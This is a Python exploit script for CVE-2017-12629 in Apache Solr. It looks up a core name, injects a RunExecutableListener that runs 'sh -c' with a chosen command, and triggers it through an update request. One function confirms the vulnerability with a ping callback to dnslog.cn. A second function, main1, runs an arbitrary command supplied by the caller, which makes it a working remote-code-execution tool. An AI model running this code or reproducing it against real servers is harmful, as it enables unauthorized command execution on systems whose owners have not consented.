import requests
import json
import time
import string
import random


HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "en-US,en;q=0.5",
    "connection": "close",
    "user-agent": "mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",
}


DNS_HEADERS = {
"Accept": "*/*",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "zh-CN,zh;q=0.9",
"Connection": "keep-alive",
"Cookie": "UM_distinctid=1761c48a9aa8a0-0d283f9a0e01d-51402e1a-100200-1761c48a9ab7a2; PHPSESSID=b0vo952deup7ho6n6e482ddm37;, CNZZDATA1278305074=262987125-1606789220-%7C1608977604",
"Host": "www.dnslog.cn",
"Referer": "http://www.dnslog.cn/",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
}


def Get_core(ip):
    try:
        url = ip + "/solr/admin/cores?indexInfo=false&wt=json"
        r = requests.get(url, timeout=25, headers=HEADERS, verify=False)
        core_name = list(json.loads(r.text)["status"])[0]
    except:
        return "core获取失败"
    return core_name



def Get_dnslog():
    url = "http://www.dnslog.cn/getdomain.php?t=0.5081695881484336"
    r = requests.get(url, headers=DNS_HEADERS, timeout=25)
    return r.text


def Listener_name():
    name = (''.join(random.sample(string.ascii_letters + string.digits, 5)))
    return name




def main(ip):
    try:
        core = Get_core(ip)
    except:
        return "缺少core值"
    dnslog = Get_dnslog()
    listen = Listener_name()
    cmd = "ping " + dnslog
    HEADERS1 = {
            "Host": ip,
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Connection": "close",
            "Content-Length": "158"
            }
    data = f'''
    {{
    "add-listener":{{
    "event":"postCommit",
    "name":"{listen}",
    "class":"solr.RunExecutableListener",
    "exe":"sh",
    "dir":"/bin/",
    "args":["-c", "{cmd}"]
    }}
    }}
    '''
    
    listen_url = ip + "/solr/" + core + "/config"
    r_listen = requests.post(listen_url, headers=HEADERS1,data=data, timeout=25, verify=False)
    r = requests.get(listen_url)
    if listen in r.text:
        # print('next')
        HEADERS2 = {
            "Host": ip,
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Connection": "close",
            "Content-Type": "application/json",
            "Content-Length": "15",
            }
        data = '[{"id":"test"}]'
        exp_url = ip + "/solr/" + core + "/update"
        r_exp = requests.post(exp_url, headers=HEADERS2, data=data, timeout=25, verify=False)
        url = "http://www.dnslog.cn/getrecords.php?t=0.5081695881484336"
        for i in range(1,13):
            r1 = requests.get(url, headers=DNS_HEADERS)
            time.sleep(10)
            if "dnslog.cn" in r1.text:
                return "存在漏洞CVE-2017-12629，请及时修复! 无回显但可直接利用"
        return "不存在漏洞CVE-2017-12629"
    else:
        return "不存在漏洞CVE-2017-12629"


def main1(ip,cmd):
    try:
        core = Get_core(ip)
    except:
        return "缺少core值"
    listen = Listener_name()
    HEADERS1 = {
            "Host": ip,
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Connection": "close",
            "Content-Length": "158"
            }
    data = f'''
    {{
    "add-listener":{{
    "event":"postCommit",
    "name":"{listen}",
    "class":"solr.RunExecutableListener",
    "exe":"sh",
    "dir":"/bin/",
    "args":["-c", "{cmd}"]
    }}
    }}
    '''
    
    listen_url = ip + "/solr/" + core + "/config"
    r_listen = requests.post(listen_url, headers=HEADERS1,data=data, timeout=25, verify=False)
    r = requests.get(listen_url)
    if listen in r.text:
        # print('next')
        HEADERS2 = {
            "Host": ip,
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Connection": "close",
            "Content-Type": "application/json",
            "Content-Length": "15",
            }
        data = '[{"id":"test"}]'
        exp_url = ip + "/solr/" + core + "/update"
        r_exp = requests.post(exp_url, headers=HEADERS2, data=data, timeout=25, verify=False)
        return "存在漏洞CVE-2017-12629,无回显但可直接利用"




# if __name__ == '__main__':
#     main('http://192.168.0.108:8983')
